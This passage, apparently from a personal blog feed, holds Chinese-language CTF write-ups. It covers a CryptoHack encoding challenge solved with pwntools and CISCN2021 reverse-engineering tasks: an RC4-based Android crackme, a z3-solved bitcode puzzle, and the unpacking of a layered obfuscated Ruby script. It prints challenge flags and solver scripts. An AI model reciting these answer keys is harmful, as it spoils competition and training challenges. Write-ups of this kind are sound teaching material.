    <content type="html"><![CDATA[<p>不错的密码学平台，慢慢学</p><a id="more"></a><h1 id="Encoding-Challenge"><a href="#Encoding-Challenge" class="headerlink" title="Encoding Challenge"></a>Encoding Challenge</h1><p>Pwntools的简单使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;socket.cryptohack.org&#x27;</span>, <span class="number">13377</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">json_recv</span>():</span></span><br><span class="line">    line = r.recvline()</span><br><span class="line">    <span class="keyword">return</span> json.loads(line.decode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">json_send</span>(<span class="params">hsh</span>):</span></span><br><span class="line">    request = json.dumps(hsh).encode()</span><br><span class="line">    r.sendline(request)</span><br><span class="line"></span><br><span class="line">ENCODINGS = [</span><br><span class="line">    <span class="string">&quot;base64&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hex&quot;</span>,</span><br><span class="line">    <span class="string">&quot;rot13&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bigint&quot;</span>,</span><br><span class="line">    <span class="string">&quot;utf-8&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">received = json_recv()</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Received type: &quot;</span>)</span><br><span class="line">print(received[<span class="string">&quot;type&quot;</span>])</span><br><span class="line">print(<span class="string">&quot;Received encoded value: &quot;</span>)</span><br><span class="line">print(received[<span class="string">&quot;encoded&quot;</span>])</span><br><span class="line">i = ENCODINGS.index(received[<span class="string">&#x27;type&#x27;</span>])</span><br><span class="line">decoded = received[<span class="string">&#x27;encoded&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">decoded = b64decode(decoded)</span><br><span class="line">decoded = <span class="built_in">str</span>(decoded)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">elif</span> i == <span class="number">1</span>:</span><br><span class="line">decoded = n2s(<span class="built_in">int</span>(decoded, <span class="number">16</span>))</span><br><span class="line">decoded = <span class="built_in">str</span>(decoded)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">elif</span> i == <span class="number">2</span>:</span><br><span class="line">decoded = codecs.decode(decoded, <span class="string">&#x27;rot_13&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> i == <span class="number">3</span>:</span><br><span class="line">decoded = n2s(<span class="built_in">int</span>(decoded, <span class="number">16</span>))</span><br><span class="line">decoded = <span class="built_in">str</span>(decoded)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">elif</span> i == <span class="number">4</span>:</span><br><span class="line">decoded = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> received[<span class="string">&#x27;encoded&#x27;</span>]:</span><br><span class="line">decoded += <span class="built_in">chr</span>(c)</span><br><span class="line"><span class="built_in">print</span> (decoded)</span><br><span class="line">to_send = &#123;</span><br><span class="line">    <span class="string">&quot;decoded&quot;</span>: decoded</span><br><span class="line">&#125;</span><br><span class="line">json_send(to_send)</span><br><span class="line"></span><br><span class="line">print(json_recv())</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;不错的密码学平台，慢慢学&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/categories/CTF/"/>
    
    <category term="Crypto" scheme="https://s0uthwood.github.io/categories/CTF/Crypto/"/>
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/tags/CTF/"/>
    
    <category term="Crypto" scheme="https://s0uthwood.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2021 RE writeup</title>
    <link href="https://s0uthwood.github.io/2021/05/20/CISCN2021-RE-writeup/"/>
    <id>https://s0uthwood.github.io/2021/05/20/CISCN2021-RE-writeup/</id>
    <published>2021-05-19T17:21:59.000Z</published>
    <updated>2021-07-02T11:56:49.849Z</updated>
    
    <content type="html"><![CDATA[<ul><li>glass</li><li>baby_rc</li><li>little_evil</li><li>HMI</li><li>gift</li></ul><p>TODO: 研究gift</p><a id="more"></a><h1 id="glass"><a href="#glass" class="headerlink" title="glass"></a>glass</h1><p>安卓逆向，使用jeb打开，发现在java层仅进行了简单的输入，然后进入so层判断</p><p>用ida打开so层，直接搜索java，进入判断函数</p><p>下面的字符串应该是密钥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qmemcpy(v6, <span class="string">&quot;12345678&quot;</span>, <span class="keyword">sizeof</span>(v6));</span><br></pre></td></tr></table></figure><p>然后调用了三个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sub_FFC(v7, v6, v4);</span><br><span class="line">sub_1088(v7, flag, <span class="number">39</span>);</span><br><span class="line">sub_10D4(flag, <span class="number">39</span>, v6, v4);</span><br></pre></td></tr></table></figure><p>进入查看，第一个是RC4密钥初始化，第二个是RC4加密，第三个是对密文进行简单的运算</p><p>从字符串里拿密文，写脚本进行求解，先对简单运算进行反向运算，然后找个RC4密码的脚本，跑一下就可以找到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">cipher = [<span class="number">0xA3</span>, <span class="number">0x1A</span>, <span class="number">0xE3</span>, <span class="number">0x69</span>, <span class="number">0x2F</span>, <span class="number">0xBB</span>, <span class="number">0x1A</span>, <span class="number">0x84</span>, <span class="number">0x65</span>, <span class="number">0xC2</span>, <span class="number">0xAD</span>, <span class="number">0xAD</span>, <span class="number">0x9E</span>, <span class="number">0x96</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">0x1F</span>, <span class="number">0x8E</span>, <span class="number">0x36</span>, <span class="number">0x4F</span>, <span class="number">0xE1</span>, <span class="number">0xEB</span>, <span class="number">0xAF</span>, <span class="number">0xF0</span>, <span class="number">0xEA</span>, <span class="number">0xC4</span>, <span class="number">0xA8</span>, <span class="number">0x2D</span>, <span class="number">0x42</span>, <span class="number">0xC7</span>, <span class="number">0x6E</span>, <span class="number">0x3F</span>, <span class="number">0xB0</span>, <span class="number">0xD3</span>, <span class="number">0xCC</span>, <span class="number">0x78</span>, <span class="number">0xF9</span>, <span class="number">0x98</span>, <span class="number">0x3F</span>, <span class="number">0</span>]</span><br><span class="line">key = [<span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x38</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__rc4_init</span>(<span class="params">key</span>):</span></span><br><span class="line">    keylength = <span class="built_in">len</span>(key)</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % keylength]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_crypt</span>(<span class="params">key, data</span>):</span></span><br><span class="line">    S = __rc4_init(key)</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> data:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        k = (a ^ S[(S[i] + S[j]) % <span class="number">256</span>]).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        result += k</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span>(<span class="params">k</span>):</span></span><br><span class="line">    ret = []</span><br><span class="line">    <span class="keyword">while</span> k &gt; <span class="number">0</span>:</span><br><span class="line">        ret.append(k &amp; <span class="number">0xff</span>)</span><br><span class="line">        k &gt;&gt;= <span class="number">8</span></span><br><span class="line">    <span class="keyword">return</span> ret[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s, s2n</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">    cipher[j] ^= key[j % <span class="number">8</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">39</span>, <span class="number">3</span>):</span><br><span class="line">    cipher[j], cipher[j + <span class="number">1</span>], cipher[j + <span class="number">2</span>] = cipher[j + <span class="number">1</span>] ^ cipher[j + <span class="number">2</span>], cipher[j + <span class="number">1</span>] ^ cipher[j], cipher[j] ^ cipher[j + <span class="number">1</span>] ^ cipher[j + <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (rc4_crypt(key, cipher))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;CISCN&#123;6654d84617f627c88846c172e0f4d46c&#125;\xec&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="baby-bc"><a href="#baby-bc" class="headerlink" title="baby_bc"></a>baby_bc</h1><p>不知道bc文件是什么，用 <code>file</code> 命令查看，发现是 <code>LLVM ir bitcode</code> 文件，上网搜索，使用 <code>clang -o baby_bc baby.bc</code> 搞成 <code>elf</code> 文件</p><p>拖入ida进行查看</p><p>首先对输入进行判断，分析输入的应该是长度是25的字符串，每个字符都在 <code>0-5</code> 之间</p><p>要拿到flag需要通过两个验证函数</p><p>第一个函数是将输入填入到map中，map中非零位输入应该为0，零位的输入不能为0</p><p>第二个函数是对map进行验证，分析后发现总共进行了如下验证：</p><ul><li>每行的数字不能相同</li><li>每列的数字不能相同</li><li>每行相邻两个数字的大小关系需要符合row矩阵的要求</li><li>每列相邻两个数字的大小关系需要符合col矩阵的要求</li></ul><p>知道要求后直接上z3约束求解器拿flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">flag = [Int(<span class="string">&quot;flag_%i&quot;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    s.add(flag[i] &gt; <span class="number">0</span>)</span><br><span class="line">    s.add(flag[i] &lt; <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">s.add(flag[<span class="number">12</span>] == <span class="number">4</span>)</span><br><span class="line">s.add(flag[<span class="number">18</span>] == <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add_row = <span class="number">0</span></span><br><span class="line">    add_col = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        add_row += flag[i * <span class="number">5</span> + j]</span><br><span class="line">        add_col += flag[j * <span class="number">5</span> + i]</span><br><span class="line">    s.add(add_row == <span class="number">15</span>)</span><br><span class="line">    s.add(add_col == <span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">s.add(flag[<span class="number">5</span>] &gt; flag[<span class="number">6</span>])</span><br><span class="line">s.add(flag[<span class="number">20</span>] &gt; flag[<span class="number">21</span>])</span><br><span class="line">s.add(flag[<span class="number">3</span>] &gt; flag[<span class="number">4</span>])</span><br><span class="line">s.add(flag[<span class="number">13</span>] &gt; flag[<span class="number">14</span>])</span><br><span class="line">s.add(flag[<span class="number">22</span>] &gt; flag[<span class="number">23</span>])</span><br><span class="line"></span><br><span class="line">s.add(flag[<span class="number">10</span>] &lt; flag[<span class="number">11</span>])</span><br><span class="line"></span><br><span class="line">s.add(flag[<span class="number">2</span>] &gt; flag[<span class="number">7</span>])</span><br><span class="line">s.add(flag[<span class="number">4</span>] &gt; flag[<span class="number">9</span>])</span><br><span class="line"></span><br><span class="line">s.add(flag[<span class="number">13</span>] &lt; flag[<span class="number">18</span>])</span><br><span class="line">s.add(flag[<span class="number">16</span>] &lt; flag[<span class="number">21</span>])</span><br><span class="line">s.add(flag[<span class="number">19</span>] &lt; flag[<span class="number">24</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            <span class="keyword">if</span> j == k:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            s.add(flag[<span class="number">5</span> * i + j] != flag[<span class="number">5</span> * i + k])</span><br><span class="line">            s.add(flag[<span class="number">5</span> * j + i] != flag[<span class="number">5</span> * k + i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    model = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">        <span class="built_in">print</span> (model[flag[i]].as_long().real, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;\nfinish&#x27;</span>)</span><br><span class="line"><span class="comment"># 1425353142354212153442315</span></span><br></pre></td></tr></table></figure><p>最后把两个地方改成 0 就行了</p><h1 id="little-evil"><a href="#little-evil" class="headerlink" title="little_evil"></a>little_evil</h1><h2 id="基本分析"><a href="#基本分析" class="headerlink" title="基本分析"></a>基本分析</h2><p>直接用ida直接打开会看到一个叫做”squashfs”，而且和ruby有关，但比赛的时候没有多想，然后就走远了</p><p><img data-src="珍贵截图.png" alt=""></p><p>放一张珍贵截图</p><p>后来得知正确方法需要先用binwalk分解一下，这里有个坑，需要自己手动装一个”squashfs”的插件</p><p>顺便补充一下什么是”squashfs”：基于Linux内核使用的压缩只读文件系统。难怪要用binwalk，沉思</p><h2 id="利用输出去混淆"><a href="#利用输出去混淆" class="headerlink" title="利用输出去混淆"></a>利用输出去混淆</h2><p>分解后翻一下目录，可以找到一个 <code>out.rb</code> 的文件</p><p>打开后发现是一个被严重混淆的脚本，大概长下面这样</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$l1Il=<span class="string">&quot;&quot;</span>;</span><br><span class="line">$l1lI=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">llIl</span><span class="params">()</span></span> $lI1lll=$lI1lll<span class="params">|7; <span class="keyword">end</span>;</span></span><br><span class="line"><span class="params">def l1lll() $lI1lll=10; <span class="keyword">end</span>;</span></span><br><span class="line"><span class="params">def llI1l() $lI1lll=$lI1lll|</span><span class="number">4</span>; <span class="keyword">end</span>;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lIlI</span><span class="params">()</span></span> $lI1lll=$lI1lll+<span class="number">3</span>; <span class="keyword">end</span>;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">l111</span><span class="params">()</span></span> $lI1lll=$lI1lll%<span class="number">3</span>; <span class="keyword">end</span>;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lI1IlI</span><span class="params">()</span></span> $lI1lll=$lI1lll<span class="params">|3; <span class="keyword">end</span>;</span></span><br><span class="line"><span class="params">def ll1l1() $lI1lll=$lI1lll*8; <span class="keyword">end</span>;</span></span><br><span class="line"><span class="params">def l1lI() $lI1lll=$lI1lll-3; <span class="keyword">end</span>;</span></span><br><span class="line"><span class="params">def lI1lII() $lI1lll=$lI1lll%1; <span class="keyword">end</span>;</span></span><br><span class="line"><span class="params">def lIlIl() $lI1lll=$lI1lll&amp;10; <span class="keyword">end</span>;</span></span><br><span class="line"><span class="params">def lIll() $lI1lll=$lI1lll-4; <span class="keyword">end</span>;</span></span><br><span class="line"><span class="params">def lII1() $lI1lll=$lI1lll%2; <span class="keyword">end</span>;</span></span><br><span class="line"><span class="params">def l1III() $lI1lll=$lI1lll|</span><span class="number">1</span>; <span class="keyword">end</span>;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">l1l111</span><span class="params">()</span></span> $lI1lll=$lI1lll<span class="params">|5; <span class="keyword">end</span>;</span></span><br><span class="line"><span class="params">def l1IIII() $lI1lll=$lI1lll%10; <span class="keyword">end</span>;</span></span><br><span class="line"><span class="params">def l11I() $l1Il=$l1Il+$lI1lll.chr; <span class="keyword">end</span>;</span></span><br><span class="line"><span class="params">def lIlll() $lI1lll=$lI1lll*9; <span class="keyword">end</span>;</span></span><br><span class="line"><span class="params">def l11IlI() $lI1lll=$lI1lll-8; <span class="keyword">end</span>;</span></span><br><span class="line"><span class="params">def lI1I1() $lI1lll=$lI1lll+5; <span class="keyword">end</span>;</span></span><br><span class="line"><span class="params">def ll11lI() $lI1lll=$lI1lll&amp;9; <span class="keyword">end</span>;</span></span><br><span class="line"><span class="params">def lII1l1()</span></span><br><span class="line"><span class="params">    #send($l1Il[0,4], $l1Il[4,$l1Il.length]);</span></span><br><span class="line"><span class="params">    aFile=File.new(&quot;out2.rb&quot;, &quot;w&quot;);</span></span><br><span class="line"><span class="params">    aFile.syswrite($l1Il);</span></span><br><span class="line"><span class="params">    aFile.close;</span></span><br><span class="line"><span class="params"><span class="keyword">end</span>;</span></span><br></pre></td></tr></table></figure><p>最后一个函数里本来只有一个 <code>send</code> 方法，这个方法是执行第一个参数的函数，后面的参数都是这个函数的变量</p><p>这里跟着学长学习了一个针对解释性语言混淆的办法，就是直接输出这个send中的变量</p><p>输出之后还是一个相似的脚本，简单换一下行，长这样：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># eval</span></span><br><span class="line">$llll=<span class="string">&quot;&quot;</span>;</span><br><span class="line">$llII=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">l1llI</span><span class="params">()</span></span>$l1lI1l=$l1lI1l<span class="params">|7; <span class="keyword">end</span>; </span></span><br><span class="line"><span class="params">def ll1III()$l1lI1l=$l1lI1l%7; <span class="keyword">end</span>; </span></span><br><span class="line"><span class="params">def lllI()$l1lI1l=$l1lI1l/4; <span class="keyword">end</span>; </span></span><br><span class="line"><span class="params">def lIl1l()$l1lI1l=$l1lI1l-3; <span class="keyword">end</span>; </span></span><br><span class="line"><span class="params">def l1lll()$l1lI1l=$l1lI1l|</span><span class="number">10</span>; <span class="keyword">end</span>; </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">l11I1I</span><span class="params">()</span></span>$l1lI1l=<span class="number">10</span>; <span class="keyword">end</span>; </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">l1l1</span><span class="params">()</span></span>$l1lI1l=$l1lI1l&amp;<span class="number">7</span>; <span class="keyword">end</span>; </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">l1II</span><span class="params">()</span></span>$l1lI1l=$l1lI1l%<span class="number">8</span>; <span class="keyword">end</span>; </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ll1I</span><span class="params">()</span></span>$l1lI1l=$l1lI1l<span class="params">|8; <span class="keyword">end</span>; </span></span><br><span class="line"><span class="params">def ll11()$l1lI1l=$l1lI1l^6; <span class="keyword">end</span>; </span></span><br><span class="line"><span class="params">def ll1l1I()$l1lI1l=$l1lI1l|</span><span class="number">1</span>; <span class="keyword">end</span>; </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lI1Il</span><span class="params">()</span></span>$l1lI1l=$l1lI1l<span class="params">|3; <span class="keyword">end</span>; </span></span><br><span class="line"><span class="params">def llI1I()$l1lI1l=$l1lI1l+6; <span class="keyword">end</span>; </span></span><br><span class="line"><span class="params">def llIl1()$l1lI1l=$l1lI1l*4; <span class="keyword">end</span>; </span></span><br><span class="line"><span class="params">def lI1ll()$l1lI1l=$l1lI1l*5; <span class="keyword">end</span>; </span></span><br><span class="line"><span class="params">def l1111()$l1lI1l=$l1lI1l^7; <span class="keyword">end</span>; </span></span><br><span class="line"><span class="params">def l1lII()$l1lI1l=$l1lI1l^4; <span class="keyword">end</span>; </span></span><br><span class="line"><span class="params">def lIIl()$l1lI1l=$l1lI1l%5; <span class="keyword">end</span>; </span></span><br><span class="line"><span class="params">def lII11()$l1lI1l=$l1lI1l+9; <span class="keyword">end</span>; </span></span><br><span class="line"><span class="params">def lI11I()$llll=$llll+$l1lI1l.chr; <span class="keyword">end</span>; </span></span><br><span class="line"><span class="params">def l1IlI()send($llll[0,4], $llll[4,$llll.length]); <span class="keyword">end</span>; </span></span><br></pre></td></tr></table></figure><p>一开始的 <code>eval</code> 就是 <code>send</code> 中调用的函数，可以分析出来后面的东西就是要用来执行的，因为这是解释性语言，直接输出就拿到源代码了</p><p>和刚才进行同样的操作，拿到第三份脚本</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">begin</span> $_=$$/$$;@_=$_+$_;$-<span class="number">_</span>=$_-@_</span><br><span class="line">$__=-&gt;<span class="number">_</span>&#123;<span class="number">_</span>==[]<span class="params">||</span><span class="number">_</span>==<span class="string">&#x27;&#x27;</span>?$.<span class="symbol">:</span>$_+$__[<span class="number">_</span>[$_..$-<span class="number">_</span>]]&#125;</span><br><span class="line">@__=-&gt;<span class="number">_</span>,&amp;_<span class="number">_</span>&#123;<span class="number">_</span>==[]?[]<span class="symbol">:</span>[_<span class="number">_</span>[<span class="number">_</span>[$.]]]+@__[<span class="number">_</span>[$_..$-<span class="number">_</span>],&amp;_<span class="number">_</span>]&#125;</span><br><span class="line">$_____=-&gt;<span class="number">_</span>&#123;@__[[*<span class="number">_</span>],&amp;-&gt;_<span class="number">_</span>&#123;_<span class="number">_</span>[$.]&#125;]&#125;</span><br><span class="line">@_____=-&gt;<span class="number">_</span>&#123;@__[[*<span class="number">_</span>],&amp;-&gt;_<span class="number">_</span>&#123;_<span class="number">_</span>[$-<span class="number">_</span>]&#125;]&#125;</span><br><span class="line">$______=-&gt;<span class="number">_</span>&#123;__<span class="number">_</span>,_____<span class="number">_</span>=$_____[<span class="number">_</span>],@_____[<span class="number">_</span>];____<span class="number">_</span>=$__[__<span class="number">_</span>];___<span class="number">_</span>=&#123;&#125;;_<span class="number">_</span>=$.;(<span class="number">_</span>=-&gt;&#123;</span><br><span class="line">  ___<span class="number">_</span>[_____<span class="number">_</span>[_<span class="number">_</span>]]=__<span class="number">_</span>[_<span class="number">_</span>];(_<span class="number">_</span>+=$_)==____<span class="number">_</span> ?<span class="symbol">____:</span><span class="number">_</span>[]&#125;)[]&#125;</span><br><span class="line">@______=-&gt;<span class="number">_</span>,_<span class="number">_</span>&#123;<span class="number">_</span>=[*<span class="number">_</span>]+[*_<span class="number">_</span>];___<span class="number">_</span>=$__[<span class="number">_</span>];__<span class="number">_</span>=&#123;&#125;;_<span class="number">_</span>=$.;(____<span class="number">_</span>=-&gt;&#123;</span><br><span class="line">  __<span class="number">_</span>[<span class="number">_</span>[_<span class="number">_</span>][$.]]=<span class="number">_</span>[_<span class="number">_</span>][$_];(_<span class="number">_</span>+=$_)==___<span class="number">_</span> 